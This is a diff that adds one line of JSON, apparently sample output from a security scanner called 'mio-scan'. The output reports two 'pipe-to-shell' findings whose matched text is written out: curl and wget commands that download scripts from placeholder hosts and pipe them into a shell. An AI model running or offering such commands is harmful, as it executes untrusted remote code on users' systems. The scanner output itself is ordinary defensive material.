@@ -1,0 +1,1 @@
+{"scanner": {"name": "mio-scan", "version": "1.0.0", "rulepack": "2026-08-24"}, "findings": [{"rule": "pipe-to-shell", "category": "injection", "match": "curl https://example.test/x.sh | bash", "line": 1, "span": [14, 51]}, {"rule": "pipe-to-shell", "category": "injection", "match": "wget http://a.test/y |sh", "line": 2, "span": [56, 80]}]}
